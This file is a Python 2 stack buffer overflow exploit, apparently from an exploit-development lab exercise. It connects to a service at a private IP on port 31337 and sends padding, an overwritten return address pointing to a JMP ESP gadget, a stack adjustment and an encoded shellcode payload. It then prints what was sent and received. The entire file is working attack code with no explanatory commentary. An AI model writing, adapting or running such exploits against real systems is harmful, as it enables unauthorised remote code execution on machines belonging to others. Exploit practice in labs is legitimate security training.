#!/usr/bin/env python2
import socket
import struct

# setup IP that we are connecting to
RHOST = "192.168.246.133"
RPORT = 31337

#setup TCP socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

sub_esp_10 = "\x83\xec\x10"

shellcode =  ""
shellcode += "\xd9\xc8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x56\xbe"
shellcode += "\x4b\x2d\xda\x1b\x31\x73\x18\x83\xeb\xfc\x03\x73"
shellcode += "\x5f\xcf\x2f\xe7\xb7\x8d\xd0\x18\x47\xf2\x59\xfd"
shellcode += "\x76\x32\x3d\x75\x28\x82\x35\xdb\xc4\x69\x1b\xc8"
shellcode += "\x5f\x1f\xb4\xff\xe8\xaa\xe2\xce\xe9\x87\xd7\x51"
shellcode += "\x69\xda\x0b\xb2\x50\x15\x5e\xb3\x95\x48\x93\xe1"
shellcode += "\x4e\x06\x06\x16\xfb\x52\x9b\x9d\xb7\x73\x9b\x42"
shellcode += "\x0f\x75\x8a\xd4\x04\x2c\x0c\xd6\xc9\x44\x05\xc0"
shellcode += "\x0e\x60\xdf\x7b\xe4\x1e\xde\xad\x35\xde\x4d\x90"
shellcode += "\xfa\x2d\x8f\xd4\x3c\xce\xfa\x2c\x3f\x73\xfd\xea"
shellcode += "\x42\xaf\x88\xe8\xe4\x24\x2a\xd5\x15\xe8\xad\x9e"
shellcode += "\x19\x45\xb9\xf9\x3d\x58\x6e\x72\x39\xd1\x91\x55"
shellcode += "\xc8\xa1\xb5\x71\x91\x72\xd7\x20\x7f\xd4\xe8\x33"
shellcode += "\x20\x89\x4c\x3f\xcc\xde\xfc\x62\x98\x13\xcd\x9c"
shellcode += "\x58\x3c\x46\xee\x6a\xe3\xfc\x78\xc6\x6c\xdb\x7f"
shellcode += "\x5f\x7a\xdc\x50\xe7\xeb\x22\x51\x17\x25\xe1\x05"
shellcode += "\x47\x5d\xc0\x25\x0c\x9d\xed\xf3\xb8\x97\x79\x3c"
shellcode += "\x94\x5e\x78\xd4\xe6\x9e\x6a\x78\x6f\x78\xdc\xd0"
shellcode += "\x3f\xd5\x9d\x80\xff\x85\x75\xcb\xf0\xfa\x66\xf4"
shellcode += "\xdb\x92\x0d\x1b\xb5\xcb\xb9\x82\x9c\x80\x58\x4a"
shellcode += "\x0b\xed\x5b\xc0\xb9\x11\x15\x21\xc8\x01\x42\x56"
shellcode += "\x32\xda\x93\xf3\x32\xb0\x97\x55\x65\x2c\x9a\x80"
shellcode += "\x41\xf3\x65\xe7\xd2\xf4\x9a\x76\xe2\x8f\xad\xec"
shellcode += "\x4a\xf8\xd1\xe0\x4a\xf8\x87\x6a\x4a\x90\x7f\xcf"
shellcode += "\x19\x85\x7f\xda\x0e\x16\xea\xe5\x66\xca\xbd\x8d"
shellcode += "\x84\x35\x89\x11\x77\x10\x89\x56\x87\xe6\xa6\xfe"
shellcode += "\xef\x18\xf7\xfe\xef\x72\xf7\xae\x87\x89\xd8\x41"
shellcode += "\x67\x71\xf3\x09\xef\xf8\x92\xf8\x8e\xfd\xbe\x5d"
shellcode += "\x0e\xfd\x4d\x46\xa1\x84\x3e\x79\x42\x79\x57\x1e"
shellcode += "\x43\x79\x57\x20\x78\xaf\x6e\x56\xbf\x73\xd5\x69"
shellcode += "\x8a\xd6\x7c\xe0\xf4\x45\x7e\x21"

#build a message 
buf = ""
buf += "A" * (offset_srp - len(buf))     #padding
buf += struct.pack("<I", ptr_jmp_esp)   #EIP should be here
buf += sub_esp_10
buf += shellcode
buf += "D" * (buf_totlen - len(buf))    #trailing padding 
buf += "\n"

#send the message down the socket
s.send(buf)

#print out what we sent
print "Send: {0}".format(buf)

#receive data back
data = s.recv(1024)

#print out what we rec
print "Recieved: {0}".format(data)



